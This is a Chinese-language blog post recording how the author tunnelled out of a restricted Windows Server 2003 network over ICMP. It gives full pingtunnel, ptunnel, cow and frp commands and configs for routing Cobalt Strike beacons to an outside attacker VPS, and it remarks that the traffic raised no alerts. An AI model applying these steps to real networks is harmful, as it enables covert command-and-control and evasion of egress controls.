记一次严苛环境的ICMP隧道

2022-05-23 8 min read

前言

记录一次比较严苛环境下的隧道，TCP、UDP不出，DNS是自己的内网服务器，DNS也不出网，没有HTTP。只有ping是出网的，但由于系统为windows server 2003 x86 32位系统，极大部分工具都不能使用，特别是go语言写的程序，兼容性极差，毕竟新语言，能理解。

其实在v1.12版本就已经出现了不兼容的情况了（现在v1.18），按理说用低版本的go编译或许也能解决，但低于1.13的go没有Go Module(也就是go mod)解决依赖问题，我也不是很懂go，暂时是陷入了僵局，所以才会找同类软件替代，此处的ptunnel（c编写）替换pingtunel（go）就是，除此之外还用ladon替换fscan。

Pingtunnel

go编写，各平台客户端都有。
客户端一定要管理员/root权限。
客户端一定要管理员/root权限。
客户端一定要管理员/root权限。

https://github.com/esrrhs/pingtunnel

建议：关闭系统默认ping

echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

服务端

vps上开启服务端（注意noprint和nolog两个参数，noprint为调试输出，记录当前连接状况等，nolog为日志输入，将连接状况记录到日志中，如果不需要这两个参数将其置为1即可，此处均置为1）

./pingtunnel -type server -nolog 1 -noprint 1

客户端 - socks

伪装成socks流量的话，cs没法走socks上线，只能再用工具把socks转http流量，再上线cs。

pingtunnel.exe -type client -l :8082 -s 43.1.x.x -sock5 1 -nolog 1 -noprint 1

此时需要将socks5隧道转换为http隧道，用的是cow，goproxy或许也可以。

https://github.com/cyfdecyf/cow/releases/tag/0.9.8

其中cow的配置文件如下

# 即监听本地socks8082端口，转发到http的1080端口
listen = http://127.0.0.1:1080
proxy = socks5://127.0.0.1:8082

上线cs [稳定]

上cs的listener设置。

artifact和beacon都能正确执行命令，有回显。

内网上线其他主机，change two 地方。(当然得保证内网tcp通信）

# 即监听本地socks8082端口，转发到http的1080端口
listen = http://0.0.0.0:1080
proxy = socks5://127.0.0.1:8082

上线frp [稳定]

加一条参数

[common]
http_proxy = socks5://127.0.0.1:8082

遇到的问题：

  • 如果客户端连接失败服务端重启试下。怀疑可能是流量太大，不稳定。

  • 自己在5g流量+vps 8m带宽条件下，frp稳定性糟糕。只能算是勉强能用，进程还经常崩。

    「怀疑这是因为复现环境都在本机，所有流量都走了一个出口，导致的延迟。」

不出所料，客户端不在本地搭建，选用vps搭建frp的客户端，操作还是流畅。

都是正常通信流量，没有爆红。

客户端 - tcp

pingtunnel.exe -type client -l :8002 -s 43.1.x.x -t 43.1.x.x:9999 -tcp 1 -nolog 1 -noprint 1

上述-s参数指向的服务端vps，-t指向的流量转发的目的地址，两个地址可以为一台，也可以分开。

由于pingtunnel走tcp只能做到端口转发。此处只演示上线cs。

上线cs [稳定]

上线cs的原理，即通过pingtunnel监听本地8002端口，把流量通过ICMP伪装成tcp转发到-t参数的此端口上。

因此我们需要建立两个listener。

生成ICMP监听的beacon即可。

遇到的问题：

  • 打开不会及时上线，有时候需要重启pingtunnel客户端才能上一次心跳包。

    「因为网络条件不稳定」

  • 只有第一次上线的心跳包

    「这是因为复现环境都在本机，所有流量都走了一个出口，导致的延迟」

  • artifact可能会失败。

    「这是因为复现环境都在本机，所有流量都走了一个出口，导致的延迟」

吸取上述问题，这里攻击机vps选用43.x，被控机也选用羔性能 vps 1.116.x.x，注意观察两个session的外网ip。

artifact的外网ip为1.116.x.x，为正确的出网外网ip。

beacon的外网ip为43.x，此处是流量走的pingtunnel的服务端。

流量分别走的两台vps，操作十分流畅顺滑。

Ptunnel

kali，debian类自带。默认只有linux版，windows版(c写的)有魔改哥写好了。

https://github.com/ptunnel-win/ptunnel

自行编译好后，还要准备wincap包。

这个工具的语法比较绕，这里记录一下。

root@VM-16-9-debian:~# ptunnel -h
ptunnel v 0.72.
Usage:   ptunnel -p <addr> -lp <port> -da <dest_addr> -dp <dest_port> [-m max_tunnels] [-v verbosity] [-f logfile]
         ptunnel [-m max_threads] [-v verbosity] [-c <device>]
     -p: Set address of peer running packet forwarder. This causes
         ptunnel to operate in forwarding mode - the absence of this
         option causes ptunnel to operate in proxy mode.
    -lp: Set TCP listening port (only used when operating in forward mode)
    -da: Set remote proxy destination address if client
         Restrict to only this destination address if server
    -dp: Set remote proxy destionation port if client
         Restrict to only this destination port if server
     -m: Set maximum number of concurrent tunnels
     -v: Verbosity level (-1 to 4, where -1 is no output, and 4 is all output)
     -c: Enable libpcap on the given device.
     -f: Specify a file to log to, rather than printing to standard out.
     -s: Client only. Enables continuous output of statistics (packet loss, etc.)

Starting the proxy (needs to run as root):
 [root #] ptunnel
Starting a client (also needs root):
 [root #] ptunnel -p proxy.pingtunnel.com -lp 8000 -da login.domain.com -dp 22 -c eth0
And then using the tunnel to ssh to login.domain.com:
 [user $] ssh -p 8000 localhost
And that's it. Enjoy your tunnel!
